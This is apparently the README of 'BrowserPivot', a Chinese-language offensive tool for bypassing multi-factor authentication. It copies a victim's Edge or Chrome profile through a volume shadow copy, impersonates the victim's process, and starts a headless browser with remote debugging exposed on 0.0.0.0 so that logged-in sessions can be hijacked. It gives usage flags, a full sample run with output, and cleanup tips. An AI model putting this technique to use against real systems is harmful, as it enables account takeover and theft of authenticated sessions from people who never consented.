# BrowserPivot

BrowserPivot是一个基于卷影复制和浏览器调试模式功能以达到绕过MFA验证的自动化辅助工具。

# 使用场景

- 无法使用明文账号密码登录网站
- 无法使用Cookies登录网站

# 使用方法

```
-p 需要模拟的进程PID，通常为要访问的资源用户PID
-l 启动非占用本地端口
-b 请选择chrome或者msedge，其他选择请自行修改代码
```



```
C:\Users\rootrain\source\repos\BrowserPivot\BrowserPivot\bin\Debug>BrowserPivot.exe -p 10732 -l 2555 -b msedge

 ____                                  _____ _            _
|  _ \                                |  __ (_)          | |
| |_) |_ __ _____      _____  ___ _ __| |__) |__   _____ | |_
|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  ___/ \ \ / / _ \| __|
| |_) | | | (_) \ V  V /\__ \  __/ |  | |   | |\ V / (_) | |_
|____/|_|  \___/ \_/\_/ |___/\___|_|  |_|   |_| \_/ \___/ \__|

[+] Volume: \\?\Volume{e8e4545b-7571-4c89-ba6f-e6cf232eb558}\
[+] Shadow copy ID: {9688E39D-BD6F-4115-B596-90C6BCC71D26}
[+] Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
[+] Copy directory \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Users\rootrain\AppData\Local\Microsoft\Edge\User Data to directory C:\Users\rootrain\AppData\Local\UwFwjfWgw9
[+] msedge path: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
[+] Process handle: True
[+] Impersonated user: DESKTOP-TAVA6P8\rootrain
[+] Start process: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe --user-data-dir=C:\Users\rootrain\AppData\Local\UwFwjfWgw9 --remote-debugging-port=2555 --remote-debugging-address=0.0.0.0 --headless about:blank
[+] Shadows deleted successfully
```



# 注意事项

```
1.如发现C盘磁盘占用过高，请清除卷影复制的目录，位于C:\Users\%USERNAME%\AppData\Local\
2.如果进程无法进行模拟，可以多试几个PID，或者手动启动进行并模拟
```

